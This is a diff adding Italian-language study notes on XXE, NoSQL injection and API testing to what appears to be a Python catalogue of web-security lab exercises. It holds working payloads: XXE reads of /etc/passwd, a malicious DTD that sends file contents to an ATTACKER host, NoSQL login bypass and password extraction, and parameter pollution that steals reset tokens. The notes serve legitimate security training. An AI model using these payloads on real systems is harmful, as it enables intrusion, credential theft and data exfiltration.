@@ -888,6 +888,257 @@ SSRF = macro(
 )
 
 
+# ===========================================================================
+#  11. XXE INJECTION
+# ===========================================================================
+XXE = macro(
+    "XXE Injection",
+    "Interferire con il parsing XML per leggere file o fare SSRF.",
+    (
+        "La XML External Entity Injection (XXE) sfrutta il parsing XML per leggere file dal "
+        "server o interagire con back-end/sistemi esterni. Le entita' XML personalizzate si "
+        "dichiarano nella DTD (dentro DOCTYPE); un'entita' ESTERNA usa SYSTEM + un URL, anche "
+        "file:// (lettura file) o http:// (SSRF).\n\n"
+        "Prevenzione: disabilitare la risoluzione delle entita' esterne e il supporto a XInclude."
+    ),
+    references=PS + "/xxe",
+    children=[
+        micro("XXE classica (lettura di file)",
+              "Definire un'entita' esterna e vederla nella risposta.", [
+            test("Leggere un file con un'entita' esterna",
+                 goal="Restituire il contenuto di un file nella risposta.",
+                 payload="<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>",
+                 process="Introduci un DOCTYPE con un'entita' esterna e usa &xxe; in un campo il cui valore torna nella risposta. Testa ogni nodo XML uno alla volta."),
+            lab("Lab: lettura di /etc/passwd",
+                process="Lab risolto inserendo <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> e sostituendo productId con &xxe;: la risposta contiene 'Invalid product ID:' seguito dal file."),
+        ]),
+        micro("SSRF via XXE", "Usare l'entita' esterna per raggiungere la rete interna.", [
+            test("Entita' esterna verso un host interno",
+                 goal="Far fare al server una richiesta HTTP interna.",
+                 payload="<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://internal.vulnerable-website.com/\"> ]>",
+                 process="Punta l'entita' a un URL interno e usala in un campo restituito (interazione bidirezionale) o in blind (vedi Blind XXE)."),
+        ]),
+        micro("Superfici di attacco nascoste",
+              "XInclude, upload SVG, cambio di Content-Type.", [
+            test("XInclude",
+                 goal="Attaccare quando non controlli l'intero documento (es. dati in una SOAP lato server).",
+                 payload="<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+                 process="Se il tuo dato viene inserito dal server in un XML, usa XInclude in quel singolo campo (non serve il DOCTYPE)."),
+            lab("Lab: XInclude",
+                process="Lab risolto impostando productId a un payload XInclude che include file:///etc/passwd."),
+            test("Upload SVG",
+                 goal="Raggiungere XXE da una funzione di upload immagini.",
+                 payload="<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"16\">&xxe;</text></svg>",
+                 process="SVG e DOCX sono basati su XML: carica un SVG con l'entita' esterna; il contenuto del file appare nell'immagine resa."),
+            lab("Lab: XXE via SVG avatar",
+                process="Lab risolto creando un SVG con entita' esterna su file:///etc/hostname e caricandolo come avatar di un commento: l'hostname compare nell'immagine."),
+            test("Cambiare il Content-Type in XML",
+                 goal="Trovare XXE anche su richieste non-XML.",
+                 payload="Content-Type: text/xml\n\n<?xml version=\"1.0\"?><foo>bar</foo>",
+                 process="Se un endpoint accetta anche XML, riformatta una POST (es. x-www-form-urlencoded) in XML per aprire la superficie XXE."),
+        ]),
+        micro("Blind XXE: rilevamento (OAST)",
+              "Quando il valore dell'entita' non torna nella risposta.", [
+            test("Entita' esterna verso Collaborator",
+                 goal="Confermare la XXE con un'interazione out-of-band.",
+                 payload="<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> ]>",
+                 process="Punta l'entita' a un dominio Collaborator e usala in un campo; monitora DNS/HTTP."),
+            lab("Lab: Blind XXE OAST",
+                process="Lab risolto inserendo l'entita' esterna verso un sottodominio Collaborator e usando &xxe; in productId; le interazioni compaiono in Poll now."),
+            test("Entita' parametro XML (%)",
+                 goal="Aggirare validazione/hardening che blocca le entita' normali.",
+                 payload="<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"> %xxe; ]>",
+                 process="Le entita' parametro si dichiarano e si usano con % e vivono nella DTD: utili quando le entita' normali (&) sono bloccate."),
+            lab("Lab: Blind XXE con entita' parametro",
+                process="Lab risolto con <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR\"> %xxe; ]> e verificando le interazioni in Collaborator."),
+        ]),
+        micro("Blind XXE: esfiltrazione dati",
+              "DTD malevola esterna per portare fuori i file.", [
+            test("Esfiltrazione via DTD esterna",
+                 goal="Portare il contenuto di un file su un server controllato.",
+                 payload="<!-- malicious.dtd sul tuo server: -->\n<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>\">\n%eval;\n%exfil;\n<!-- payload inviato all'app: -->\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER/malicious.dtd\"> %xxe;]>",
+                 process="Ospita una DTD che legge il file in un'entita' e lo esfiltra nell'URL di una richiesta HTTP; richiama la DTD esterna dal payload. Per file con newline (es. /etc/passwd) usa un file senza newline (/etc/hostname) o FTP."),
+            lab("Lab: esfiltrazione via Collaborator",
+                process="Lab risolto ospitando sull'exploit server una DTD che legge file:///etc/hostname ed esfiltra su http://COLLABORATOR/?x=%file;, poi inviando <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]> e leggendo l'hostname nelle interazioni."),
+        ]),
+        micro("Blind XXE: via messaggi di errore",
+              "Provocare un errore che contiene i dati.", [
+            test("Errore con DTD malevola",
+                 goal="Leggere un file dentro un messaggio di errore.",
+                 payload="<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;",
+                 process="Fai valutare l'entita' file dentro un percorso inesistente: l'errore 'FileNotFoundException: /nonexistent/<contenuto>' rivela il file. Richiede che l'app mostri l'errore."),
+            lab("Lab: XXE error-based (DTD esterna)",
+                process="Lab risolto ospitando la DTD error-based su /etc/passwd e inviando <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]>: il messaggio di errore contiene il file."),
+            test("Riuso di una DTD locale",
+                 goal="Error-based anche senza connessioni out-of-band.",
+                 payload="<!DOCTYPE foo [\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n<!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> ...ridefinizione error-based...'>\n%local_dtd;\n]>",
+                 process="Richiama una DTD gia' presente sul server (es. docbookx.dtd di GNOME) e ridefinisci una sua entita' per l'attacco error-based. Trova i DTD locali provando a caricarli e leggendo gli errori."),
+            lab("Lab: riuso DTD locale",
+                process="Lab risolto riusando /usr/share/yelp/dtd/docbookx.dtd e ridefinendo l'entita' ISOamso con l'exploit error-based su /etc/passwd."),
+        ]),
+    ],
+)
+
+
+# ===========================================================================
+#  12. NOSQL INJECTION
+# ===========================================================================
+NOSQL_INJECTION = macro(
+    "NoSQL Injection",
+    "Alterare query NoSQL (sintassi o operatori), es. in MongoDB.",
+    (
+        "I database NoSQL (document/key-value/wide-column/graph) usano linguaggi di query "
+        "diversi. Due tipi di injection: Syntax Injection (si altera la sintassi della query) "
+        "e Operator Injection (si iniettano operatori come $ne, $in, $regex, $where).\n\n"
+        "Prevenzione: validare con allowlist di caratteri; query parametrizzate; per gli "
+        "operatori, allowlist delle chiavi consentite."
+    ),
+    references=PS + "/nosql-injection",
+    children=[
+        micro("Syntax Injection", "Rompere e riscrivere la sintassi della query.", [
+            test("Fuzzing e carattere interpretato",
+                 goal="Capire se l'input altera la query.",
+                 payload="'\"`{\n;$Foo}\n$Foo \\xYZ\n-- singolo carattere:\n'",
+                 process="Invia una fuzz string (URL-encoded o come stringa JSON) e cerca errori/cambiamenti. Poi invia solo ' e verifica se rompe la sintassi; conferma con l'escape '\\''."),
+            test("Condizioni booleane",
+                 goal="Verificare di poter influenzare la logica.",
+                 payload="' && 0 && 'x\n' && 1 && 'x",
+                 process="Invia una condizione sempre falsa e una sempre vera: se le risposte differiscono, l'injection influenza la query."),
+            test("Sovrascrivere le condizioni",
+                 goal="Restituire piu' dati del previsto.",
+                 payload="'||'1'=='1\n-- null byte per troncare condizioni successive:\nfizzy'%00",
+                 process="Inietta una condizione sempre vera (||'1'=='1) per far restituire tutto. Un null byte (%00) puo' far ignorare a MongoDB le condizioni successive (es. this.released == 1). Attenzione: una condizione sempre-vera riusata in UPDATE/DELETE puo' modificare/cancellare dati."),
+            lab("Lab: boolean + bypass di 'released'",
+                process="Lab risolto: ' nel parametro category da' errore JS; con Gifts' && 0 && 'x (falso) nessun prodotto, Gifts' && 1 && 'x (vero) i Gifts, infine Gifts'||1||' mostra anche i prodotti non rilasciati."),
+        ]),
+        micro("Operator Injection", "Iniettare operatori di query ($ne, $in, $regex).", [
+            test("Inserire operatori",
+                 goal="Trasformare un valore in un operatore.",
+                 payload="JSON:  {\"username\":{\"$ne\":\"invalid\"}}\nURL:   username[$ne]=invalid",
+                 process="In JSON usa oggetti annidati; in URL la notazione [$op]. Se non va: converti GET->POST, Content-Type: application/json, corpo JSON (estensione Content Type Converter)."),
+            test("Bypass dell'autenticazione",
+                 goal="Loggarsi senza credenziali valide.",
+                 payload="{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}\n{\"username\":{\"$in\":[\"admin\",\"administrator\",\"superadmin\"]},\"password\":{\"$ne\":\"\"}}",
+                 process="$ne su username e password seleziona il primo utente della collezione; $in mira a username noti/ipotizzati."),
+            lab("Lab: login bypass con $ne / $regex",
+                process="Lab risolto: username {\"$ne\":\"\"} logga; {\"$regex\":\"wien.*\"} funziona; con password {\"$ne\":\"\"} e username {\"$regex\":\"admin.*\"} si entra come admin."),
+        ]),
+        micro("Estrarre dati con $where (JavaScript)",
+              "Quando la query usa operatori che eseguono JS.", [
+            test("Esfiltrazione carattere per carattere",
+                 goal="Ricostruire un valore (es. password) con condizioni booleane JS.",
+                 payload="admin' && this.password[0] == 'a' || 'a'=='b\nadmin' && this.password.match(/\\d/) || 'a'=='b\n-- lunghezza:\nadministrator' && this.password.length < 30 || 'a'=='b",
+                 process="Con $where puoi iniettare JS: testa un carattere alla volta (o match() per classi di caratteri), e la lunghezza con password.length < N."),
+            test("Identificare i nomi dei campi",
+                 goal="Scoprire quali campi esistono.",
+                 payload="admin' && this.username!='\nadmin' && this.foo!='",
+                 process="Confronta un campo noto (username) con uno sospetto (password) e uno inesistente (foo): se password si comporta come username, esiste. Dictionary attack per molti nomi."),
+            lab("Lab: ricavare la password dell'admin",
+                process="Lab risolto: verifichi l'injection (' da' errore, wiener' && '1'=='1 vero), trovi lunghezza 8 (length < 9 vero, < 8 falso), poi con Intruder Cluster bomb su administrator' && this.password[§0§]=='§a§ ricavi la password."),
+        ]),
+        micro("Estrarre dati con operatori",
+              "Quando non c'e' JS: iniettare $where, keys(), $regex, tempi.", [
+            test("Iniettare $where e leggere i nomi dei campi",
+                 goal="Abilitare l'esecuzione JS e scoprire i campi.",
+                 payload="{\"username\":\"wiener\",\"password\":\"peter\",\"$where\":\"0\"}\n{...,\"$where\":\"1\"}\n\"$where\":\"Object.keys(this)[0].match('^.{0}a.*')\"",
+                 process="Aggiungi $where con 0/1: se le risposte differiscono, il JS viene eseguito. Poi con keys() ricostruisci i nomi dei campi un carattere alla volta."),
+            test("Esfiltrazione con $regex",
+                 goal="Estrarre dati senza JS.",
+                 payload="{\"username\":\"admin\",\"password\":{\"$regex\":\"^a.*\"}}",
+                 process="Verifica $regex (^.*), poi estrai carattere per carattere con ^a.*, ^ab.*, ..."),
+            test("Injection basata sui tempi",
+                 goal="Rilevare/sfruttare quando non c'e' differenza in risposta.",
+                 payload="{\"$where\":\"sleep(5000)\"}\nadmin'+function(x){if(x.password[0]===\"a\"){sleep(5000)};}(this)+'",
+                 process="Stabilisci un tempo di riferimento, poi inietta un ritardo condizionato: se la risposta e' piu' lenta, la condizione e' vera."),
+        ]),
+    ],
+)
+
+
+# ===========================================================================
+#  13. API TESTING
+# ===========================================================================
+API_TESTING = macro(
+    "API Testing",
+    "Mappare e attaccare le API: endpoint, metodi, mass assignment, parameter pollution.",
+    (
+        "Le API fanno comunicare i sistemi; le loro vulnerabilita' colpiscono riservatezza, "
+        "integrita' e disponibilita'. Si parte dalla ricognizione (endpoint, documentazione) e "
+        "si prosegue provando metodi, content-type, parametri ed endpoint nascosti.\n\n"
+        "Prevenzione: proteggere/aggiornare la documentazione, allowlist dei metodi, verificare "
+        "il Content-Type, errori generici, protezioni su tutte le versioni; per il mass "
+        "assignment, allowlist delle proprieta' aggiornabili."
+    ),
+    references=PS + "/api-testing",
+    children=[
+        micro("Ricognizione delle API", "Trovare endpoint e documentazione.", [
+            test("Identificare gli endpoint",
+                 goal="Mappare la superficie dell'API.",
+                 payload="GET /api/books\n/api/books/mystery",
+                 process="Individua i percorsi delle risorse. Cerca pattern /api/ e riferimenti negli script JS (BApp JS Link Finder)."),
+            test("Trovare la documentazione",
+                 goal="Ottenere la lista degli endpoint e come usarli.",
+                 payload="/api   /swagger/index.html   /openapi.json",
+                 process="Cerca gli endpoint di documentazione; se trovi /api/swagger/v1/users/123 esamina anche /api/swagger/v1, /api/swagger, /api. Analizza OpenAPI/JSON/YAML con Burp Scanner o OpenAPI Parser (o Postman/SoapUI)."),
+            lab("Lab: documentazione su /api",
+                process="Lab risolto loggando con wiener e aprendo /api (documentazione esposta)."),
+        ]),
+        micro("Interazione con gli endpoint", "Metodi HTTP e tipi di contenuto.", [
+            test("Metodi HTTP supportati",
+                 goal="Scoprire funzioni aggiuntive di un endpoint.",
+                 payload="OPTIONS /api/products/1/price\n-- poi prova GET/POST/PUT/PATCH/DELETE",
+                 process="OPTIONS rivela i metodi ammessi; prova tutti i verbi (lista integrata di Intruder)."),
+            test("Tipi di contenuto supportati",
+                 goal="Provocare errori o aggirare difese cambiando formato.",
+                 payload="Content-Type: application/json\n{\"price\":0}",
+                 process="Cambia Content-Type e riformatta il body (BApp Content Type Converter XML<->JSON)."),
+            lab("Lab: PATCH del prezzo",
+                process="Lab risolto: OPTIONS su /api/products/1/price mostra GET/PATCH; da loggato, PATCH con Content-Type application/json e {\"price\":0} azzera il prezzo della giacca."),
+        ]),
+        micro("Endpoint e parametri nascosti", "Scoprire cio' che non e' documentato.", [
+            test("Endpoint nascosti",
+                 goal="Trovare funzioni non documentate.",
+                 payload="PUT /api/user/§update§   (payload: delete, add, ...)",
+                 process="Con Intruder sostituisci la parte finale del path con funzioni comuni, usando wordlist di convenzioni API."),
+            test("Parametri nascosti",
+                 goal="Trovare parametri non documentati.",
+                 process="Usa Intruder, BApp Param Miner (fino a 65.536 nomi per richiesta) o Content Discovery."),
+        ]),
+        micro("Mass Assignment",
+              "Parametri interni associati automaticamente dai framework.", [
+            test("Individuare e sfruttare campi nascosti",
+                 goal="Impostare un campo sensibile (es. isAdmin).",
+                 payload="GET mostra: {\"id\":123,\"isAdmin\":\"false\"}\nPATCH: {\"username\":\"wiener\",\"isAdmin\":true}",
+                 process="Confronta i campi restituiti dalla GET con quelli accettati dalla PATCH: aggiungi il campo sensibile (prima con un valore non valido per capire se e' elaborato, poi con il valore voluto)."),
+            lab("Lab: chosen_discount",
+                process="Lab risolto: la risposta GET /api/checkout contiene chosen_discount, assente nella POST. Aggiungendolo alla POST ({\"chosen_discount\":{\"percentage\":100},...}) l'ordine passa."),
+        ]),
+        micro("Server-side Parameter Pollution (query string)",
+              "Iniettare parametri nella richiesta lato server verso un'API interna.", [
+            test("Troncare, iniettare, sovrascrivere",
+                 goal="Manipolare la query inviata all'API interna.",
+                 payload="name=peter%23foo         (# tronca: rimuove publicProfile=true)\nname=peter%26foo=xyz     (& aggiunge un parametro)\nname=peter%26name=carlos (sovrascrive: PHP usa l'ultimo, Express il primo, ASP.NET li unisce)",
+                 process="Inserisci #, & ed = (URL-encoded) e osserva la risposta: puoi troncare condizioni (publicProfile), aggiungere o sovrascrivere parametri."),
+            lab("Lab: SSPP -> reset token (query string)",
+                process="Lab risolto sul /forgot-password: con %26field=x%23 scopri un parametro 'field'; brute-force (wordlist Server-side variable names) trova email e reset_token; username=administrator%26field=reset_token%23 restituisce il token di reset dell'admin."),
+        ]),
+        micro("Server-side Parameter Pollution (REST e formati)",
+              "Nei percorsi REST e nei dati strutturati.", [
+            test("Percorsi REST (path traversal)",
+                 goal="Alterare i parametri inseriti nel path lato server.",
+                 payload="name=peter%2f..%2fadmin   ->   /api/private/users/peter/../admin",
+                 process="Se il valore finisce nel path di una richiesta interna, usa sequenze ../ per cambiare risorsa; # e ? aiutano a capire la struttura e a troncare."),
+            test("Formati strutturati (JSON/XML)",
+                 goal="Iniettare proprieta' nei dati strutturati lato server.",
+                 payload="name=peter\",\"access_level\":\"administrator",
+                 process="Se il tuo input finisce in un JSON/XML lato server senza encoding, chiudi il valore e aggiungi una proprieta' (es. access_level). Vale anche nelle risposte."),
+            lab("Lab: SSPP nel path REST",
+                process="Lab risolto sul /forgot-password: con # e ? capisci che l'input va nel path; con ../../../../openapi.json%23 leggi la definizione /api/internal/v1/users/{username}/field/{field}; poi username=../../v1/users/administrator/field/passwordResetToken%23 restituisce il token di reset."),
+        ]),
+    ],
+)
+
+
 # Tutte le macrocategorie, nell'ordine degli appunti.
 MACROS = [
     SQL_INJECTION,
@@ -900,6 +1151,9 @@ MACROS = [
     FILE_UPLOAD,
     RACE_CONDITIONS,
     SSRF,
+    XXE,
+    NOSQL_INJECTION,
+    API_TESTING,
 ]
 
 
